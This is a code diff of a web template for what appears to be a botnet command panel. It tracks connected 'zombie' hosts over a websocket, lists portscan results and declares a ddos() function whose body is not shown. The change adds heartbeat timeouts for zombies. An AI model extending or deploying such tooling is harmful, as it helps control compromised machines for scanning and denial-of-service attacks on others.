@@ -9,7 +9,7 @@
 <head>
 	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
 
-	<script type="text/javascript" src="{{ STATIC_URL }}js/ws4redis.js"></script>
+	<script type="text/javascript" src="{{ STATIC_URL }}js/ws4redis.min.js"></script>
 	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 	<script type="text/javascript" src="{{STATIC_URL}}js/bootbox.min.js"></script>
 	<script type="text/javascript" src="{{STATIC_URL}}js/bootstrap.min.js"></script>
@@ -60,26 +60,46 @@
         }
     )
 
-$(function(){
-	solo_socket = WS4Redis({
-		uri:'{{WEBSOCKET_URI}}attacker?subscribe-session',
-		receive_message:msghandler,
-		heartbeat_msg: "--heartbeat--",
-	});
-});
 
-var zombies = {};
-function msghandler(json){
+
+
+var solo_socket = null;
+
+$(function(){
+
+	solo_socket = new WebSocket('{{WEBSOCKET_URI}}attacker?subscribe-session');
+
+
+	solo_socket.onopen = function(e){
+		//solo_socket.send("LOLz");
+		//setInterval(function(){solo_socket.send("LOL");},3000);
+		//setInterval(function(){solo_socket.send("MOLS");},1000);
+	}
+	solo_socket.onmessage = function(e){
+		console.log(e);
+	}
+
+	var zombies = {};
+	function msghandler(json){
 
 	json = JSON.parse(json);
 	///new or reconnected zombie
 	if(json.hasOwnProperty('new') == true){
 		if(zombies.hasOwnProperty(json['newzombieId'])==false){
-			zombies[json['newzombieId']]=json['newzombieId'];
+			zombies[json['newzombieId']]=setTimeout(function(){
+					//mark dead
+					console.log("DEAD");
+			},10000);
 			$("table[name='zombies']").append(	"<tr class='active'><td id="+json['newzombieId']+">"+json['newzombieHost']+"<span class ='glyphicon glyphicon-flash'></span></td></tr>");
+
 		}
 		else{
-			//mark as active
+			clearInterval(zombies[json['newzombieId']]);
+			zombies[json['newzombieId']]=setTimeout(function(){
+					//mark dead
+					console.log("DEAD");
+			},10000);
+
 		}
 	}
 	//update from portscan
@@ -87,13 +107,9 @@ function msghandler(json){
 
 			$("tbody[name='hosts']").append(	"<tr class='active'><td><span class ='glyphicon glyphicon-flash'>"+json['host']+"</span></td></tr>");
 	}
-	//zombie lost connection
-	else if(json.hasOwnProperty("dead")==true){
-		//mark zombie as dead
-	}
 
 }
-
+});
 
 
 function ddos(){
